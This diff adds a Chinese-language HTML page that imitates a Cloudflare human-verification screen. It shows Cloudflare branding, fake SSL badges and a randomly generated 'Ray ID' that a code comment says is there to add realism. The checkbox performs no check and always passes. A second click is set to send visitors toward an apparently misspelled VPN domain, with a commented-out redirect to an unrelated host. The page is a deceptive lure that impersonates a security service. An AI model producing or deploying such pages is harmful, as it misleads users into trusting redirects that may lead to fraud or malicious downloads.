@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>人机验证</title>
+    <style>
+        :root {
+            --primary-orange: #f38020;
+            --success-green: #22c55e;
+            --bg-gray: #f0f2f5;
+            --text-main: #1e293b;
+            --text-sub: #64748b;
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--bg-gray);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-image: radial-gradient(#d1d5db 1px, transparent 1px);
+            background-size: 24px 24px;
+        }
+
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 440px;
+            padding: 40px 30px;
+            border-radius: 40px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.1);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .icon-header {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #ff9d42, #f38020);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 20px rgba(243, 128, 32, 0.3);
+        }
+        .icon-header svg { width: 35px; fill: white; }
+
+        h2 { color: var(--text-main); margin: 0 0 10px; font-size: 24px; }
+        .subtitle { color: var(--text-sub); font-size: 14px; margin-bottom: 30px; }
+
+        .meta-bar {
+            background: #f8fafc;
+            border: 1px solid #edf2f7;
+            border-radius: 50px;
+            padding: 8px 15px;
+            font-size: 11px;
+            color: var(--text-sub);
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+        .ray-id { background: #fff; padding: 2px 8px; border-radius: 10px; color: var(--primary-orange); border: 1px solid #fee2e2; font-family: monospace; }
+
+        .verify-box {
+            border: 1px solid #e2e8f0;
+            border-radius: 30px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-align: left;
+        }
+        .verify-box:hover { border-color: #cbd5e1; background: #fafafa; }
+
+        .checkbox {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #cbd5e1;
+            border-radius: 6px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--primary-orange);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        /* 成功状态样式控制 */
+        .card[data-state="success"] .verify-box {
+            border-color: var(--success-green);
+            background: #f0fdf4;
+        }
+        .card[data-state="success"] .checkbox {
+            border: none;
+            color: var(--success-green);
+            font-size: 28px;
+        }
+
+        .title { font-weight: 600; color: var(--text-main); font-size: 17px; display: block; }
+        .desc { font-size: 12px; color: var(--text-sub); }
+
+        .status-msg {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            background: #f1f5f9;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.3s, color 0.3s;
+        }
+        .card[data-state="success"] .status-msg { background: #dcfce7; color: #166534; }
+
+        /* 重置按钮样式 */
+        .reset-btn {
+            margin-top: 20px;
+            font-size: 12px;
+            color: var(--text-sub);
+            text-align: right;
+            cursor: pointer;
+            background: none;
+            border: none;
+            width: 100%;
+            padding: 5px;
+            transition: color 0.2s;
+        }
+        .reset-btn:hover { color: var(--primary-orange); }
+
+        .footer { margin-top: 40px; font-size: 11px; color: #94a3b8; border-top: 1px solid #f1f5f9; padding-top: 20px; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="card" id="mainCard" data-state="idle">
+    <div class="icon-header">
+        <svg viewBox="0 0 24 24"><path d="M12 2L3 7L12 12L21 7L12 2Z" stroke="white" stroke-width="2" fill="none"/><path d="M3 12L12 17L21 12" stroke="white" stroke-width="2" fill="none"/><path d="M3 17L12 22L21 17" stroke="white" stroke-width="2" fill="none"/></svg>
+    </div>
+    
+    <h2>验证您是人类</h2>
+    <p class="subtitle">为确保连接安全，请完成下方验证</p>
+
+    <div class="meta-bar">
+        <span>🌐 连接安全 • Ray ID: <span class="ray-id" id="rayId">加载中...</span></span>
+        <span>🔒 SSL 加密</span>
+    </div>
+
+    <div class="verify-box" id="verifyBox">
+        <div class="checkbox" id="checkboxOuter">
+            <div class="spinner" id="spinner"></div>
+            <span id="checkMark" style="display:none">✓</span>
+        </div>
+        <div class="text">
+            <span class="title" id="boxTitle">我不是机器人</span>
+            <span class="desc" id="boxDesc">点击验证，通过人机检查</span>
+        </div>
+    </div>
+
+    <div class="status-msg" id="statusMsg">
+        🛡️ <span id="statusText">等待验证 · 点击上方区域验证身份</span>
+    </div>
+
+    <button class="reset-btn" id="resetBtn">↻ 重置验证 (无需刷新)</button>
+
+    <div class="footer">
+        ⚡ Cloudflare 安全防护 &nbsp;&nbsp; ✓ 隐私保护验证
+    </div>
+</div>
+
+<script>
+    const card = document.getElementById('mainCard');
+    const verifyBox = document.getElementById('verifyBox');
+    const spinner = document.getElementById('spinner');
+    const checkMark = document.getElementById('checkMark');
+    const boxTitle = document.getElementById('boxTitle');
+    const boxDesc = document.getElementById('boxDesc');
+    const statusText = document.getElementById('statusText');
+    const rayIdSpan = document.getElementById('rayId');
+    const resetBtn = document.getElementById('resetBtn');
+
+    // 生成随机 Ray ID 的函数
+    function generateRayId() {
+        return Math.random().toString(16).slice(2, 10) + '-' + Math.random().toString(16).slice(2, 5);
+    }
+
+    // 初始化界面
+    function init() {
+        rayIdSpan.innerText = generateRayId();
+    }
+
+    // 重置逻辑：手动恢复所有 DOM 状态
+    function resetComponent() {
+        card.setAttribute('data-state', 'idle');
+        spinner.style.display = 'none';
+        checkMark.style.display = 'none';
+        
+        boxTitle.innerText = '我不是机器人';
+        boxDesc.innerText = '点击验证，通过人机检查';
+        statusText.innerText = '等待验证 · 点击上方区域验证身份';
+        
+        // 重新随机 Ray ID 增加真实感
+        rayIdSpan.innerText = generateRayId();
+        
+        console.log('组件已重置，无需刷新页面');
+    }
+
+    // 点击验证逻辑
+    verifyBox.addEventListener('click', () => {
+        const state = card.getAttribute('data-state');
+
+        if (state === 'idle') {
+            card.setAttribute('data-state', 'verifying');
+            spinner.style.display = 'block';
+            boxTitle.innerText = '正在验证...';
+            statusText.innerText = '⏳ 正在验证请求，请稍等...';
+
+            setTimeout(() => {
+                card.setAttribute('data-state', 'success');
+                spinner.style.display = 'none';
+                checkMark.style.display = 'block';
+                boxTitle.innerText = '✓ 验证成功';
+                boxDesc.innerText = '点击此区域继续访问 首页 →';
+                statusText.innerText = '验证通过！请再次点击同一区域跳转到目标页面。';
+            }, 1000);
+
+        } else if (state === 'success') {
+            verifyBox.style.transform = 'scale(0.96)';
+            setTimeout(() => {
+                alert('触发跳转逻辑！目标地址：https://letssvpn.app');
+                // window.location.href = 'https://letkl.hgjjwl.asia/'; 
+            }, 150);
+        }
+    });
+
+    // 绑定重置按钮点击事件
+    resetBtn.addEventListener('click', (e) => {
+        e.stopPropagation(); // 防止冒泡触发 verifyBox 的点击
+        resetComponent();
+    });
+
+    init();
+</script>
+
+</body>
+</html>
